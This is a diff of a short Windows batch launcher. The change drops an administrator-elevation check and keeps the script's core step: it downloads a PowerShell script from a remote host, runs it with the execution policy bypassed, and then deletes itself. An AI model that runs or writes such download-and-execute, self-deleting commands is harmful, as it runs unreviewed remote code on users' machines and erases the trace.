@@ -1,12 +1,10 @@
 @echo off
 chcp 65001 >nul
 
-net session >nul 2>&1
-if %errorLevel% neq 0 (
-    powershell -Command "Start-Process '%~f0' -Verb RunAs"
-    exit /b
+if exist "%SystemRoot%\SysNative\WindowsPowerShell\v1.0\powershell.exe" (
+    "%SystemRoot%\SysNative\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -ExecutionPolicy Bypass -Command "irm https://tools.daomak.com/boot.ps1 | iex"
+) else (
+    powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://tools.daomak.com/boot.ps1 | iex"
 )
-
-powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://tools.daomak.com/boot.ps1 | iex"
 
 del "%~f0"
